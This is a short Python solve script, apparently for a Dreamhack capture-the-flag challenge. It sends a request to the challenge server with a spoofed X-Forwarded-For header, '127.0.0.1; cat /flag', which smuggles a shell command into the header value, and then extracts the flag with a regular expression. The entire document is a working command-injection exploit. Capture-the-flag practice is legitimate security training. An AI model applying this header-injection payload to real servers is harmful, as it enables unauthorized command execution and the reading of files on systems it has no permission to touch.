import requests, re

url = 'http://host3.dreamhack.games:14384'

res = requests.get(url, headers={'X-Forwarded-For': '127.0.0.1; cat /flag'})
print(re.search(r'DH\{[^>]*\}', res.text).group(0))
